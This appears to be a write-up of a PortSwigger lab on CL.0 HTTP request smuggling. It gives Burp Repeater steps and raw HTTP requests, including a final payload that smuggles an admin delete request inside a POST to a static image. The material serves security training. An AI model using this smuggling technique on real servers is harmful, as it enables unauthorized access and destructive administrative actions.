#  CL.0 request smuggling

## 📌 Lab Details
- **Title**: CL.0 request smuggling
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/d886863529b141ab150f460e95da5e785eaaada66785d60da132f5f0155352e6?referrer=%2fweb-security%2frequest-smuggling%2fbrowser%2fcl-0%2flab-cl-0-request-smuggling

## 🔍 Summary
CL.0 is a request-smuggling bug where the front end honors `Content-Length` but the back end treats it as 0, letting an attacker hide a full HTTP request inside another request’s body and get the back end to execute it (e.g., `GET /admin`) over a single persistent connection. Fix by making front/back HTTP parsing consistent, rejecting ambiguous headers, and closing keep-alive on malformed requests.

## 🛠 Steps to Solve
1. Send the `GET /` request to Burp Repeater twice.
2. In Burp Repeater, add both these tabs to a new group.
3. Go to the first request and convert it to a **POST** request.
4. In the body, add an arbitrary request smuggling prefix. The result should look something like this:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Cookie: session=YOUR-SESSION-COOKIE
   Connection: close
   Content-Type: application/x-www-form-urlencoded
   Content-Length: CORRECT

   GET /hopefully404 HTTP/1.1
   Foo: x
   ```
5. Change the path of the main **POST** request to point to an arbitrary endpoint that you want to test.
6. Change the path of the main POST request to point to an arbitrary endpoint that you want to test.
7. Change the Connection header of the first request to `keep-alive`.
8. Send the request and check the responses.
   - If the server responds to the second request as normal, this endpoint is not vulnerable.
   - If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this indicates that the back-end server is ignoring the Content-Length of requests.
9. Deduce that you can use requests for static files under `/resources`, such as `/resources/images/blog.svg`, to cause a CL.0 desync.
10. In order to access the `admin` panel change the path of the smuggled request to `/admin`.
11. Final Exploit:
    ```sh
    POST /resources/images/blog.svg HTTP/1.1
    Host: 0ac3001f045ee34b83bc065800e600a6.web-security-academy.net
    Cookie: session=14UKliSh47mf6ogPzCjUIQN1sOgqmIZc
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 50

    GET /admin/delete?username=carlos HTTP/1.1
    Foo: x
    ```
    
## 📖 Key Takeaways
- **Single TCP connection is essential**. Smuggling only works when requests share a persistent connection.
- **Mismatch in parsing rules** (front-end vs back-end) is the root cause — back-end treats CL as 0.
- **Good candidate targets**: static assets and endpoints that normally don’t accept bodies (images, CSS, redirect handlers, 204/304 endpoints).

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/03561d69-1659-4133-957b-f2ffb2fc62ea" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5b33b93e-6e5f-44da-96b7-0dc36bc11c5c" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/73b10ce0-b9d5-4e97-ac14-17bb2305c8c5" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a64dedcf-0460-4d24-acdf-dafbb53fdd4a" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8c208f3a-20fc-482c-b907-a49d0c292bf8" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8582ff2d-d8fd-42f9-8b47-0f43a5e08b9b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b23c6ebf-35d9-4288-949c-49f1fe21aa81" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6e1442d3-aa19-4940-897c-b3bd77515833" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7ea528f9-b343-4034-ab4c-fe7c256ed2e0" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/50ff5ca8-e958-4eca-98bf-2837bb40292a" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/25c670ad-15c2-4087-be20-8d34661a6c74" />
